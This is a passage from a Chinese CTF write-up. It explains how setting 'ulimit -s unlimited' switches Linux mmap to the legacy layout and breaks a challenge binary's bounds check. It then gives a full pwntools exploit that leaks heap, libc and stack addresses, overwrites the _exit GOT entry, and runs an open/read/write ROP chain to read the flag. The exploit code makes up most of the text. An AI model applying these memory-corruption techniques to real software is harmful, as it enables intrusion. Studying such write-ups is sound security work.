      v2 = (_QWORD *)current_6020B0;
      for ( i = 0; v2 && i 
    static int mmap_is_legacy(void)
    {
        if (current->personality & ADDR_COMPAT_LAYOUT)
            return 1;
        if (rlimit(RLIMIT_STACK) == RLIM_INFINITY)
            return 1;
        ///proc/sys/vm/legacy_va_layout
        return sysctl_legacy_va_layout;
    }
linux x86 x64 下mmap 有两种两种内存布局，一种是经典模式，一种是新的模式
mmap_is_legacy == 1 使用经典布局 - mmap 从低地址向高地址增长，也就是向栈方向增长
mmap_is_legacy ==0 使用新的模式- legacy 也 mmap bottom-up, 从高地址向低地址增长
current->personality 是 进程task_struct 的一个字段，主要用于处理不同的ABI
rlimit(RLIMIT_STACK) == RLIM_INFINITY) 这一行就是判断 stack 的资源限制是不是设置成无限制
sysctl_legacy_va_layout 即 /proc/sys/vm/legacy_va_layout 的值
mmap 的实现还存在一些 CVE, 要找找时间复现一下，总之对于这道题目，因为 边界检查时基于
新的mmap 的布局的形式，所以假如改了这个内存布局，题目里面实现的边界检查就没用了，
可以造成溢出等效果，这里还有一个坑点。。
内核版本 4.13 之后 这个函数对于 stack 的判断被删除了,而自己的ubuntu 刚好又是 4.13 的内核，
比赛的时候蛋疼的调了很久就是达不到效果。。比赛的内核版本记得时 4.4.0-114
    static int mmap_is_legacy(void)
    {
        if (current->personality & ADDR_COMPAT_LAYOUT)
            return 1;
        return sysctl_legacy_va_layout;
    }
okay 找到了漏洞点，后面操作就比较简单了，总结一下利用思路如下
  * ulimit -s unlimited mmap 变成经典内存布局
        protect  ---p
    arena    rw-p
    heap     rw-p
  * 多次分配 arena 溢出 arena 指针 到 heap 上
  * 修改 overlap 到 heap 上的 arena 指针，没开 pie, 任意地址泄露(泄露 heap, libc, stack)
  * 修改指针任意地址写 (写哪里好呢？)
因为限制了只能用 orw 系统调用，又没有可执行段，所以想到的是用rop gadget 来读flag, libc地址已经知道了
几乎就是什么都可以干了
修改 exit got 到 pop pop pop ret 的gadget, 这样就可以调用exit的时候ret 到 main 的ret 地址
修改 ret 地址 hijack ebp 到 heap 上
heap 上写 orw gadget
  * 调用 exit 触发 rop get flag
**exp 如下**
    #coding:utf-8
    from pwn import *
    import sys
    import time
    file_addr='./rswc'
    libc_addr='./libc.so.6'
    host='172.16.13.11'
    port=31348
    binary=ELF(file_addr)
    p=process(file_addr,env={"LD_PRELOAD":libc_addr})
    if len(sys.argv)==3:
        p=remote(host,port)
    def menu(op):
        p.sendlineafter('>',str(op))
    def alloc(size):
        menu(0)
        p.sendlineafter('size:',str(size))
    def edit(index,data):
        menu(1)
        p.sendlineafter('index:',str(index))
        p.sendlineafter('content:',data)
    def show(index):
        menu(2)
        p.sendlineafter('index:',str(index))
    def delete(index):
        menu(3)
        p.sendlineafter('index:',str(index))
    for i in range(0x100):
        alloc(0x20)
    def write_addr(index,target,data):
        payload='a'*0x20 
        payload+=p64(target)+p64(0x200)
        edit(index,payload)
        edit(index,data)
    # leak heap base
    show(255)
    p.recvuntil('content: ')
    heapleak=u64(p.recv(6).ljust(8,'\x00'))
    heap_base=heapleak-0x2fd0
    p.info('heap_base'+hex(heap_base))
    payload='a'*0x20
    payload+=p64(binary.got['__libc_start_main']-0x10)+'\x20'
    # leak libc base
    edit(255,payload)
    show(255)
    p.recvuntil('content: ')
    libcleak=u64(p.recv(6).ljust(8,'\x00'))
    p.info('libcleak'+hex(libcleak))
    #
    libc=ELF('./libc.so.6')
    libc_base=libcleak-libc.symbols['__libc_start_main']
    p.info('libc_base'+hex(libc_base))
    # leak stack addr
    payload='a'*0x20
    payload+=p64(libc_base+libc.symbols['environ']-0x10)+p64(0x200)
    edit(254,payload)
    show(254)
    p.recvuntil('content: ')
    stackleak=u64(p.recv(6).ljust(8,'\x00'))
    p.info('stackleak'+hex(stackleak))
    ret_addr=stackleak-0x100
    p.info('ret_addr'+hex(ret_addr))
    # write exit got 2 ret
    ppp_ret=0x00000000004012ce #0x00000000004012ce : pop r13 ; pop r14 ; pop r15 ; ret 
    pop_rbp_ret=0x00000000004007d0 #0x00000000004007d0 : pop rbp ; ret 
    leave_ret=0x0000000000400be2 #0x0000000000400be2 : leave ; ret 
    payload=p64(libc_base-0xe98)+p64(libc_base-0x210790)+p64(ppp_ret)
    payload+=p64(libc_base+libc.symbols['puts'])
    payload+=p64(libc_base+libc.symbols['mmap'])
    payload+='flag\x00'
    write_addr(253,binary.got['_exit']-0x20,payload)
    ebp_base=heap_base+0xd0-8
    # hijack ebp 2 heap 
    payload=p64(0)*2
    payload+=p64(pop_rbp_ret)
    payload+=p64(ebp_base)
    payload+=p64(leave_ret)
    write_addr(252,ret_addr-0x20+8,payload)
    print hex(ret_addr)
    pop_rdi_ret=libc_base+0x0000000000021102
    pop_rsi_ret=libc_base+0x00000000000202e8
    pop_rdx_ret=libc_base+0x0000000000001b92
    pop_rax_ret=libc_base+0x0000000000033544
    syscall_ret=libc_base+0x00000000000bc375
    orw_payload=''
    ## open
    orw_payload+=p64(pop_rdi_ret)+p64(ebp_base+0x108)
    orw_payload+=p64(pop_rsi_ret)+p64(0x0)
    orw_payload+=p64(pop_rdx_ret)+p64(0x0)
    orw_payload+=p64(pop_rax_ret)+p64(0x2)
    orw_payload+=p64(syscall_ret)
    ## read 
    orw_payload+=p64(pop_rdi_ret)+p64(0x3)
    orw_payload+=p64(pop_rsi_ret)+p64(ebp_base+0x200)
    orw_payload+=p64(pop_rdx_ret)+p64(0x30)
    orw_payload+=p64(pop_rax_ret)+p64(0x0)
    orw_payload+=p64(syscall_ret)
    ## write
    orw_payload+=p64(pop_rdi_ret)+p64(0x1)
    orw_payload+=p64(pop_rsi_ret)+p64(ebp_base+0x200)
    orw_payload+=p64(pop_rdx_ret)+p64(0x30)
    orw_payload+=p64(pop_rax_ret)+p64(0x1)
    orw_payload+=p64(syscall_ret)
    orw_payload=orw_payload.ljust(0x100,'z')
    orw_payload+='flag\x00'
    edit(251,orw_payload)
    ## get flag
    #
    raw_input('aaa')
    p.interactive()